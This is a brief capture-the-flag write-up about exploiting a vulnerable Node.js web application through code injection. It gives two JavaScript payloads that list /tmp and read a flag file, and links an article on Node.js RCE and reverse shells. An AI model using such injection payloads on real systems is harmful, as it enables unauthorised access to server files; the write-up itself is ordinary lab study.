![image-20240414043134123](./assets/image-20240414043134123.png)

Challenge was a vulnerable Nodejs Web application.

![image-20240414042650148](./assets/image-20240414042650148.png)

https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44

```
var fs=require("fs");fs.readdirSync("/tmp").toString('utf8')
var fs=require("fs");fs.readFileSync("/tmp/flag_MDA0O.txt").toString('utf8')
```

![image-20240414042823374](./assets/image-20240414042823374.png)

![image-20240414043029711](./assets/image-20240414043029711.png)

I forget to screenshot a flag file content.